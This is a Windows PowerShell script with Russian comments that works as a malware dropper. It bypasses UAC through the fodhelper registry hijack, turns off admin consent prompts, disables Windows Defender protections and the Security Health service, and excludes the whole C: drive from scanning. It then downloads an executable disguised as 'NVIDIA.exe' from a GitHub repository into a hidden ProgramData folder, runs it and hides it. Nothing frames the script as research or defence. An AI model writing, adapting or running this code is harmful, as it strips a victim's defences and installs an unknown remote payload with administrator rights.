# Проверка архитектуры системы
if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
    try {
        # Пытаемся доступиться к системным файлам для 64-битных систем
        if (Test-Path "$env:SYSTEMROOT\SysWOW64\config\system") {
            # Если доступ есть, продолжаем выполнение
            $hasAdmin = $true
        } else {
            # В случае ошибки, нужно запросить права администратора
            $hasAdmin = $false
        }
    } catch {
        $hasAdmin = $false
    }
} else {
    try {
        # Пытаемся доступиться к системным файлам для 32-битных систем
        if (Test-Path "$env:SYSTEMROOT\system32\config\system") {
            # Если доступ есть, продолжаем выполнение
            $hasAdmin = $true
        } else {
            # В случае ошибки, нужно запросить права администратора
            $hasAdmin = $false
        }
    } catch {
        $hasAdmin = $false
    }
}

# Если нет прав администратора, запускаем с повышенными правами
if (-not $hasAdmin) {
    # Добавление записи в реестр для запроса прав администратора
    Set-ItemProperty -Path "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value " " -Force
    Set-ItemProperty -Path "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" -Name "Command" -Value "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" -Force
    Start-Process -FilePath "fodhelper.exe" -ArgumentList "/silent"

    # Запуск скрипта с правами администратора
    Start-Process powershell -ArgumentList "-Command `""$MyInvocation.MyCommand.Path`" -Verb RunAs"
    exit
} else {
    # Если есть права администратора, продолжаем выполнение
    Push-Location
    Set-Location -Path $PSScriptRoot

    # Изменение настроек Windows Defender
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force

    # Удаление записи SecurityHealth из реестра
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealth" -Force

    # Захват прав на файлы и переименование
    Takeown /f "C:\Windows\System32\SecurityHealthService.exe"
    Icacls "C:\Windows\System32\SecurityHealthService.exe" /grant:r "$env:USERDOMAIN\$env:USERNAME":F /c
    Rename-Item "C:\Windows\System32\SecurityHealthService.exe" -NewName "Celka.sej"

    Takeown /f "C:\Windows\System32\SecurityHealthSystray.exe"
    Icacls "C:\Windows\System32\SecurityHealthSystray.exe" /grant:r "$env:USERDOMAIN\$env:USERNAME":F /c
    Rename-Item "C:\Windows\System32\SecurityHealthSystray.exe" -NewName "Nurik.nes"

    # Завершение процесса SecurityHealthSystray
    Stop-Process -Name "SecurityHealthSystray" -Force

    # Добавление исключения для Windows Defender
    powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\'"

    # Создание скрытой папки
    New-Item -Path "C:\ProgramData\QQQ" -ItemType Directory
    Set-ItemProperty -Path "C:\ProgramData\QQQ" -Name Attributes -Value "Hidden"

    # Скачивание и выполнение файла
    Invoke-WebRequest -Uri 'https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIA.exe' -OutFile 'C:\ProgramData\QQQ\NVIDIA.exe'
    Start-Process "C:\ProgramData\QQQ\NVIDIA.exe"

    # Установка атрибутов скрытого файла
    Set-ItemProperty -Path "C:\ProgramData\QQQ\NVIDIA.exe" -Name Attributes -Value "Hidden"
}
